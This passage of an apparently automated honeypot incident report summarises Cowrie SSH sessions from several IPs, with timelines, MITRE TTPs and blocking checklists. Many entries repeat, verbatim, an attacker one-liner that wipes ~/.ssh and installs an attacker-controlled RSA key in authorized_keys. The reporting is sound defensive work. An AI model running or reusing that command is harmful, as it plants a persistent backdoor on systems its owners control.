| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:49:30` | `cowrie.session.connect` |
| `2026-05-02 07:49:30` | `cowrie.client.version` |
| `2026-05-02 07:49:30` | `cowrie.client.kex` |
| `2026-05-02 07:49:31` | `cowrie.login.success` |
| `2026-05-02 07:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94424adb799d

| Field | Detail |
|---|---|
| **Source IP** | `115.151.72[.]122` |
| **First Seen** | 2026-05-02 07:50 |
| **Last Seen** | 2026-05-02 07:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:50:06` | `cowrie.session.connect` |
| `2026-05-02 07:50:06` | `cowrie.client.version` |
| `2026-05-02 07:50:06` | `cowrie.client.kex` |
| `2026-05-02 07:50:07` | `cowrie.login.success` |
| `2026-05-02 07:50:07` | `cowrie.session.params` |
| `2026-05-02 07:50:07` | `cowrie.command.input` |
| `2026-05-02 07:50:07` | `cowrie.command.failed` |
| `2026-05-02 07:50:07` | `cowrie.log.closed` |
| `2026-05-02 07:50:07` | `cowrie.session.params` |
| `2026-05-02 07:50:07` | `cowrie.command.input` |
| `2026-05-02 07:50:08` | `cowrie.session.file_download` |
| `2026-05-02 07:50:08` | `cowrie.log.closed` |
| `2026-05-02 07:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.151.72[.]122` to AbuseIPDB if not already reported
- [ ] Block `115.151.72[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-234c20b3bde3

| Field | Detail |
|---|---|
| **Source IP** | `115.151.72[.]122` |
| **First Seen** | 2026-05-02 07:50 |
| **Last Seen** | 2026-05-02 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:50:14` | `cowrie.session.connect` |
| `2026-05-02 07:50:14` | `cowrie.client.version` |
| `2026-05-02 07:50:14` | `cowrie.client.kex` |
| `2026-05-02 07:50:14` | `cowrie.login.success` |
| `2026-05-02 07:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.151.72[.]122` to AbuseIPDB if not already reported
- [ ] Block `115.151.72[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0713c4f3bfd

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:51 |
| **Last Seen** | 2026-05-02 07:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:51:30` | `cowrie.session.connect` |
| `2026-05-02 07:51:30` | `cowrie.client.version` |
| `2026-05-02 07:51:30` | `cowrie.client.kex` |
| `2026-05-02 07:51:30` | `cowrie.login.success` |
| `2026-05-02 07:51:30` | `cowrie.session.params` |
| `2026-05-02 07:51:30` | `cowrie.command.input` |
| `2026-05-02 07:51:30` | `cowrie.command.failed` |
| `2026-05-02 07:51:30` | `cowrie.log.closed` |
| `2026-05-02 07:51:30` | `cowrie.session.params` |
| `2026-05-02 07:51:30` | `cowrie.command.input` |
| `2026-05-02 07:51:30` | `cowrie.session.file_download` |
| `2026-05-02 07:51:30` | `cowrie.log.closed` |
| `2026-05-02 07:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81512773f698

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:51 |
| **Last Seen** | 2026-05-02 07:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:51:32` | `cowrie.session.connect` |
| `2026-05-02 07:51:32` | `cowrie.client.version` |
| `2026-05-02 07:51:32` | `cowrie.client.kex` |
| `2026-05-02 07:51:32` | `cowrie.login.success` |
| `2026-05-02 07:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d269c126a172

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]27` |
| **First Seen** | 2026-05-02 07:52 |
| **Last Seen** | 2026-05-02 07:52 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:52:11` | `cowrie.session.connect` |
| `2026-05-02 07:52:23` | `cowrie.client.version` |
| `2026-05-02 07:52:23` | `cowrie.client.kex` |
| `2026-05-02 07:52:29` | `cowrie.login.success` |
| `2026-05-02 07:52:30` | `cowrie.session.params` |
| `2026-05-02 07:52:30` | `cowrie.command.input` |
| `2026-05-02 07:52:31` | `cowrie.log.closed` |
| `2026-05-02 07:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]27` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3ca877407bd

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:53 |
| **Last Seen** | 2026-05-02 07:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:53:26` | `cowrie.session.connect` |
| `2026-05-02 07:53:26` | `cowrie.client.version` |
| `2026-05-02 07:53:27` | `cowrie.client.kex` |
| `2026-05-02 07:53:27` | `cowrie.login.success` |
| `2026-05-02 07:53:27` | `cowrie.session.params` |
| `2026-05-02 07:53:27` | `cowrie.command.input` |
| `2026-05-02 07:53:27` | `cowrie.command.failed` |
| `2026-05-02 07:53:27` | `cowrie.log.closed` |
| `2026-05-02 07:53:27` | `cowrie.session.params` |
| `2026-05-02 07:53:27` | `cowrie.command.input` |
| `2026-05-02 07:53:27` | `cowrie.session.file_download` |
| `2026-05-02 07:53:27` | `cowrie.log.closed` |
| `2026-05-02 07:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731ca6ef2ecb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:53 |
| **Last Seen** | 2026-05-02 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:53:29` | `cowrie.session.connect` |
| `2026-05-02 07:53:29` | `cowrie.client.version` |
| `2026-05-02 07:53:29` | `cowrie.client.kex` |
| `2026-05-02 07:53:29` | `cowrie.login.success` |
| `2026-05-02 07:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9804fd39965

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:54 |
| **Last Seen** | 2026-05-02 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:54:25` | `cowrie.session.connect` |
| `2026-05-02 07:54:25` | `cowrie.client.version` |
| `2026-05-02 07:54:25` | `cowrie.client.kex` |
| `2026-05-02 07:54:25` | `cowrie.login.success` |
| `2026-05-02 07:54:26` | `cowrie.session.params` |
| `2026-05-02 07:54:26` | `cowrie.command.input` |
| `2026-05-02 07:54:26` | `cowrie.command.failed` |
| `2026-05-02 07:54:26` | `cowrie.log.closed` |
| `2026-05-02 07:54:26` | `cowrie.session.params` |
| `2026-05-02 07:54:26` | `cowrie.command.input` |
| `2026-05-02 07:54:26` | `cowrie.session.file_download` |
| `2026-05-02 07:54:26` | `cowrie.log.closed` |
| `2026-05-02 07:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eabfd4293a59

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:54 |
| **Last Seen** | 2026-05-02 07:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:54:27` | `cowrie.session.connect` |
| `2026-05-02 07:54:27` | `cowrie.client.version` |
| `2026-05-02 07:54:28` | `cowrie.client.kex` |
| `2026-05-02 07:54:28` | `cowrie.login.success` |
| `2026-05-02 07:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5508e6ed7fe5

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:55 |
| **Last Seen** | 2026-05-02 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:55:28` | `cowrie.session.connect` |
| `2026-05-02 07:55:28` | `cowrie.client.version` |
| `2026-05-02 07:55:28` | `cowrie.client.kex` |
| `2026-05-02 07:55:29` | `cowrie.login.success` |
| `2026-05-02 07:55:29` | `cowrie.session.params` |
| `2026-05-02 07:55:29` | `cowrie.command.input` |
| `2026-05-02 07:55:29` | `cowrie.command.failed` |
| `2026-05-02 07:55:29` | `cowrie.log.closed` |
| `2026-05-02 07:55:29` | `cowrie.session.params` |
| `2026-05-02 07:55:29` | `cowrie.command.input` |
| `2026-05-02 07:55:29` | `cowrie.session.file_download` |
| `2026-05-02 07:55:29` | `cowrie.log.closed` |
| `2026-05-02 07:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb08c746326f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:55 |
| **Last Seen** | 2026-05-02 07:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:55:31` | `cowrie.session.connect` |
| `2026-05-02 07:55:31` | `cowrie.client.version` |
| `2026-05-02 07:55:31` | `cowrie.client.kex` |
| `2026-05-02 07:55:31` | `cowrie.login.success` |
| `2026-05-02 07:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e8055ebffd

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:56 |
| **Last Seen** | 2026-05-02 07:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:56:27` | `cowrie.session.connect` |
| `2026-05-02 07:56:27` | `cowrie.client.version` |
| `2026-05-02 07:56:27` | `cowrie.client.kex` |
| `2026-05-02 07:56:28` | `cowrie.login.success` |
| `2026-05-02 07:56:28` | `cowrie.session.params` |
| `2026-05-02 07:56:28` | `cowrie.command.input` |
| `2026-05-02 07:56:28` | `cowrie.command.failed` |
| `2026-05-02 07:56:28` | `cowrie.log.closed` |
| `2026-05-02 07:56:28` | `cowrie.session.params` |
| `2026-05-02 07:56:28` | `cowrie.command.input` |
| `2026-05-02 07:56:28` | `cowrie.session.file_download` |
| `2026-05-02 07:56:28` | `cowrie.log.closed` |
| `2026-05-02 07:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b38f57b7c58

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:56 |
| **Last Seen** | 2026-05-02 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:56:30` | `cowrie.session.connect` |
| `2026-05-02 07:56:30` | `cowrie.client.version` |
| `2026-05-02 07:56:30` | `cowrie.client.kex` |
| `2026-05-02 07:56:30` | `cowrie.login.success` |
| `2026-05-02 07:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da1132e031b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:57 |
| **Last Seen** | 2026-05-02 07:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:57:26` | `cowrie.session.connect` |
| `2026-05-02 07:57:26` | `cowrie.client.version` |
| `2026-05-02 07:57:26` | `cowrie.client.kex` |
| `2026-05-02 07:57:27` | `cowrie.login.success` |
| `2026-05-02 07:57:27` | `cowrie.session.params` |
| `2026-05-02 07:57:27` | `cowrie.command.input` |
| `2026-05-02 07:57:27` | `cowrie.command.failed` |
| `2026-05-02 07:57:27` | `cowrie.log.closed` |
| `2026-05-02 07:57:27` | `cowrie.session.params` |
| `2026-05-02 07:57:27` | `cowrie.command.input` |
| `2026-05-02 07:57:27` | `cowrie.session.file_download` |
| `2026-05-02 07:57:27` | `cowrie.log.closed` |
| `2026-05-02 07:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff569a602fb9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:57 |
| **Last Seen** | 2026-05-02 07:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:57:29` | `cowrie.session.connect` |
| `2026-05-02 07:57:29` | `cowrie.client.version` |
| `2026-05-02 07:57:29` | `cowrie.client.kex` |
| `2026-05-02 07:57:29` | `cowrie.login.success` |
| `2026-05-02 07:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d09e8f83420

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-02 07:58 |
| **Last Seen** | 2026-05-02 07:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:58:58` | `cowrie.session.connect` |
| `2026-05-02 07:58:58` | `cowrie.client.version` |
| `2026-05-02 07:58:59` | `cowrie.client.kex` |
| `2026-05-02 07:58:59` | `cowrie.login.success` |
| `2026-05-02 07:58:59` | `cowrie.session.params` |
| `2026-05-02 07:58:59` | `cowrie.command.input` |
| `2026-05-02 07:58:59` | `cowrie.command.failed` |
| `2026-05-02 07:58:59` | `cowrie.log.closed` |
| `2026-05-02 07:58:59` | `cowrie.session.params` |
| `2026-05-02 07:58:59` | `cowrie.command.input` |
| `2026-05-02 07:59:00` | `cowrie.session.file_download` |
| `2026-05-02 07:59:00` | `cowrie.log.closed` |
| `2026-05-02 07:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.17[.]249` to AbuseIPDB if not already reported
- [ ] Block `42.96.17[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf0a925f91c

| Field | Detail |
|---|---|
| **Source IP** | `42.96.17[.]249` |
| **First Seen** | 2026-05-02 07:59 |
| **Last Seen** | 2026-05-02 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:59:01` | `cowrie.session.connect` |
| `2026-05-02 07:59:01` | `cowrie.client.version` |
| `2026-05-02 07:59:01` | `cowrie.client.kex` |
| `2026-05-02 07:59:02` | `cowrie.login.success` |
| `2026-05-02 07:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
